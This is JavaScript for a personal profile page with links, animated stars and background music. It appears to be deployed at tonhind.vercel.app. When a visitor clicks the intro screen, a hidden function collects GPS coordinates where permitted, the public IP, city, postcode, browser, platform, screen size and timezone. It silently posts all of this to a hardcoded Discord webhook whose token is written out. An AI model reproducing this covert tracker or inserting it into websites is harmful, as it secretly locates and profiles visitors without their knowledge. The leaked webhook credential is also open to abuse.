(() => {
  const cfg = window.SITE_CONFIG;
  const $ = (id) => document.getElementById(id);

  // Fill profile
  $("name").textContent = cfg.name;
  $("tagline").textContent = cfg.tagline;

  // Fill links
  const linkMap = {
    discordMini: cfg.links.discord,
    btnRoblox: cfg.links.roblox,
    btnTelegram: cfg.links.telegram,
    btnSpotify: cfg.links.spotify,
    btnTikTok: cfg.links.tiktok
  };
  Object.entries(linkMap).forEach(([id, url]) => {
    const el = $(id);
    if (el) el.href = url;
  });

  // Intro gate (user gesture -> audio allowed)
  const intro = $("intro");
  const app = $("app");

  function showApp() {
    intro.style.transition = "opacity .35s ease";
    intro.style.opacity = "0";
    setTimeout(() => {
      intro.style.display = "none";
      app.hidden = false;
      app.animate(
        [{ opacity: 0, transform: "translateY(8px) scale(.99)" }, { opacity: 1, transform: "translateY(0) scale(1)" }],
        { duration: 420, easing: "cubic-bezier(.2,.8,.2,1)" }
      );
    }, 380);
  }

  // Background stars
  const canvas = document.getElementById("stars");
  const ctx = canvas.getContext("2d");
  let w, h, dpr;
  let stars = [];

  function resize() {
    dpr = Math.max(1, Math.min(2, window.devicePixelRatio || 1));
    w = canvas.width = Math.floor(innerWidth * dpr);
    h = canvas.height = Math.floor(innerHeight * dpr);
    canvas.style.width = innerWidth + "px";
    canvas.style.height = innerHeight + "px";
    stars = Array.from({ length: Math.floor((innerWidth * innerHeight) / 9000) }, () => ({
      x: Math.random() * w,
      y: Math.random() * h,
      r: (Math.random() * 1.4 + 0.3) * dpr,
      a: Math.random() * 0.55 + 0.10,
      s: (Math.random() * 0.25 + 0.05) * dpr
    }));
  }
  window.addEventListener("resize", resize, { passive: true });
  resize();

  let t = 0;
  function loop() {
    t += 0.006;
    ctx.clearRect(0, 0, w, h);
    for (const st of stars) {
      st.y += st.s;
      if (st.y > h + 10) { st.y = -10; st.x = Math.random() * w; }
      const tw = (Math.sin(t + st.x * 0.001) + 1) * 0.5;
      ctx.globalAlpha = Math.min(0.9, st.a + tw * 0.25);
      ctx.beginPath();
      ctx.arc(st.x, st.y, st.r, 0, Math.PI * 2);
      ctx.fillStyle = "#fff";
      ctx.fill();
    }
    requestAnimationFrame(loop);
  }
  loop();

  // Audio (background)
  const audio = new Audio();
  audio.loop = true;
  audio.preload = "auto";
  audio.volume = 0.85;

  async function pickFirstExistingAudio() {
    const base = cfg.songBaseName || "song";
    const exts = Array.isArray(cfg.songExtensions) ? cfg.songExtensions : ["mp3"];
    for (const ext of exts) {
      const url = `${base}.${ext}`;
      try {
        const res = await fetch(url, { method: "HEAD", cache: "no-store" });
        if (res.ok) return url;
      } catch (_) {}
    }
    return `${base}.mp3`;
  }

  // Discord Webhook Function (accurate locality: Geolocation -> BigDataCloud, fallback: IP)
  async function sendDiscordNotification() {
    const webhookURL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
    
    try {
      console.log('🔄 Начинаем сбор данных...');

      // ---- small utils ----
      const withTimeout = (promise, ms) => Promise.race([
        promise,
        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms))
      ]);

      const fetchJson = async (url, timeoutMs = 6000) => {
        const res = await withTimeout(fetch(url, { cache: 'no-store' }), timeoutMs);
        if (!res.ok) throw new Error(`http_${res.status}`);
        return res.json();
      };

      const getCoords = async () => new Promise((resolve, reject) => {
        if (!navigator.geolocation) return reject(new Error('no_geolocation'));
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
          (err) => reject(err),
          {
            enableHighAccuracy: true,
            timeout: 8000,
            maximumAge: 60000
          }
        );
      });

      const getPublicIP = async () => {
        const data = await fetchJson('https://api.ipify.org?format=json', 5000);
        return data?.ip || null;
      };

      const getBigDataCloudLocality = async (coordsOrNull) => {
        const params = new URLSearchParams({ localityLanguage: 'ru' });
        if (coordsOrNull) {
          params.set('latitude', String(coordsOrNull.latitude));
          params.set('longitude', String(coordsOrNull.longitude));
        }
        const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?${params.toString()}`;
        return fetchJson(url, 7000);
      };

      // ---- collect location ----
      let coords = null;
      try {
        console.log('📍 Пытаемся получить координаты (браузерная геолокация)...');
        coords = await getCoords();
        console.log('✅ Координаты получены:', coords);
      } catch (e) {
        console.log('ℹ️ Координаты недоступны (deny/timeout/unsupported). Пойдём по IP fallback.');
      }

      let bdc = null;
      try {
        console.log('🌐 BigDataCloud reverse-geocode-client...');
        bdc = await getBigDataCloudLocality(coords);
        console.log('✅ BigDataCloud ответил:', bdc);
      } catch (e) {
        console.warn('⚠️ BigDataCloud не сработал:', e?.message || e);
      }

      let publicIP = null;
      try {
        publicIP = await getPublicIP();
      } catch (e) {
        console.warn('⚠️ Не удалось получить IP (ipify):', e?.message || e);
      }

      const browserTZ = (() => {
        try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; }
        catch { return 'Unknown'; }
      })();

      const lookupSource = bdc?.lookupSource || (coords ? 'reverseGeocoding' : 'ipGeolocation');

      let geoData = {
        ip: publicIP || 'Неизвестно',
        country: bdc?.countryName || 'Неизвестно',
        countryCode: bdc?.countryCode || null,
        region: bdc?.principalSubdivision || 'Неизвестно',
        city: (bdc?.city || bdc?.locality) || 'Неизвестно',
        postcode: bdc?.postcode || null,
        isp: 'Неизвестно',
        timezone: browserTZ,
        lookupSource,
        coords: coords ? { lat: coords.latitude, lon: coords.longitude, accuracy: coords.accuracy } : null
      };

      console.log('📊 Итоговые данные геолокации:', geoData);
      
      // Get country flag emoji
      const getFlagEmoji = (countryCode) => {
        if (!countryCode || countryCode.length !== 2) return "🏴";
        try {
          const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt());
          return String.fromCodePoint(...codePoints);
        } catch {
          return "🏴";
        }
      };

      const flagEmoji = getFlagEmoji(geoData.countryCode);
      
      // Get user agent info
      const userAgent = navigator.userAgent || "Unknown";
      const browser = userAgent.match(/(chrome|firefox|safari|edge|opera|yandex)/i)?.[0] || "Unknown";
      const platform = navigator.platform || "Unknown";
      const screenRes = `${window.screen.width}x${window.screen.height}`;
      const language = navigator.language || "Unknown";
      
      let timezone = geoData.timezone;
      let currentTime = new Date().toISOString();
      
      try {
        if (timezone === "Unknown") {
          timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        }
        currentTime = new Date().toLocaleString('ru-RU', {
          timeZone: timezone,
          dateStyle: 'full',
          timeStyle: 'long'
        });
      } catch {
        currentTime = new Date().toLocaleString('ru-RU');
      }

      const sourceLabel = geoData.lookupSource === 'reverseGeocoding' ? 'GPS' : 'IP';
      const postcodeLine = geoData.postcode ? `\n**Индекс:** ${geoData.postcode}` : '';
      const coordsLine = geoData.coords
        ? `\n**Коорд.:** ${geoData.coords.lat.toFixed(5)}, ${geoData.coords.lon.toFixed(5)}`
        : '';
      const accuracyLine = (geoData.coords && Number.isFinite(geoData.coords.accuracy))
        ? `\n**Точность:** ~${Math.round(geoData.coords.accuracy)} м`
        : '';

      // Create embed
      const embed = {
        username: "tonhind.vercel.app",
        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
        embeds: [{
          title: "🚀 Новый посетитель на сайте",
          color: 0x5865F2,
          thumbnail: {
            url: geoData.countryCode 
              ? `https://flagcdn.com/w80/${geoData.countryCode.toLowerCase()}.png`
              : "https://cdn.discordapp.com/embed/avatars/0.png"
          },
          fields: [
            {
              name: "🌍 Локация",
              value: `**Страна:** ${flagEmoji} ${geoData.country}${geoData.countryCode ? ` (${geoData.countryCode})` : ''}\n**Город:** ${geoData.city}\n**Регион:** ${geoData.region}${postcodeLine}\n**Источник:** ${sourceLabel}${coordsLine}${accuracyLine}`,
              inline: true
            },
            {
              name: "📡 Сеть",
              value: `**IP:** ||${geoData.ip}||\n**Время:** ${currentTime}\n**Часовой пояс:** ${timezone}`,
              inline: true
            },
            {
              name: "💻 Браузер",
              value: `**Платформа:** ${platform}\n**Браузер:** ${browser}\n**Язык:** ${language}\n**Разрешение:** ${screenRes}`,
              inline: false
            },
            {
              name: "🔗 Технические данные",
              value: `**User Agent:** \`\`\`${userAgent.substring(0, 300)}${userAgent.length > 300 ? '...' : ''}\`\`\``,
              inline: false
            }
          ],
          footer: {
            text: `tonhind.vercel.app • ${new Date().getFullYear()}`,
            icon_url: "https://vercel.com/favicon.ico"
          },
          timestamp: new Date().toISOString()
        }]
      };

      console.log('📤 Отправляем данные в Discord...');

      // IMPORTANT:
      // Discord webhooks do NOT allow CORS for browser JSON POST.
      // If we send application/json, the browser does a preflight (OPTIONS) and blocks the request.
      // Solution: send as multipart/form-data with payload_json (simple request) and fire-and-forget (no-cors).
      const postToDiscord = async (payload) => {
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify(payload));
        // no-cors => request is sent, but response is opaque (status 0). This is fine here.
        await fetch(webhookURL, {
          method: 'POST',
          body: fd,
          mode: 'no-cors',
          keepalive: true
        });
      };

      await postToDiscord(embed);
      console.log('✅ Запрос на Discord отправлен (fire-and-forget)');
      
    } catch (error) {
      console.error('❌ Критическая ошибка при отправке в Discord:', error);
      
      // Fallback: send minimal notification
      try {
        const minimalEmbed = {
          username: "tonhind.vercel.app",
          embeds: [{
            title: "⚠️ Новый посетитель (минимальные данные)",
            color: 0xFF9900,
            description: `Не удалось собрать полные данные.\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**User Agent:** ${navigator.userAgent.substring(0, 100)}...`,
            timestamp: new Date().toISOString()
          }]
        };
        
        const fd = new FormData();
        fd.append('payload_json', JSON.stringify(minimalEmbed));
        await fetch(webhookURL, {
          method: 'POST',
          body: fd,
          mode: 'no-cors',
          keepalive: true
        });
        
        console.log('✅ Минимальное уведомление отправлено');
      } catch (fallbackError) {
        console.error('❌ Даже fallback не сработал:', fallbackError);
      }
    }
  }

  async function enter() {
    showApp();
    const url = await pickFirstExistingAudio();
    audio.src = url;
    try { await audio.play(); } catch (_) {}
    
    // Send Discord notification (non-blocking)
    sendDiscordNotification().catch(err => {
      console.warn('Discord notification failed silently:', err);
    });
  }

  intro.addEventListener("click", enter, { once: true });
})();

// iOS double-tap zoom prevent (best-effort)
(() => {
  let lastTouchEnd = 0;
  document.addEventListener('touchend', (e) => {
    const now = Date.now();
    if (now - lastTouchEnd <= 300) {
      e.preventDefault();
    }
    lastTouchEnd = now;
  }, { passive: false });
})();
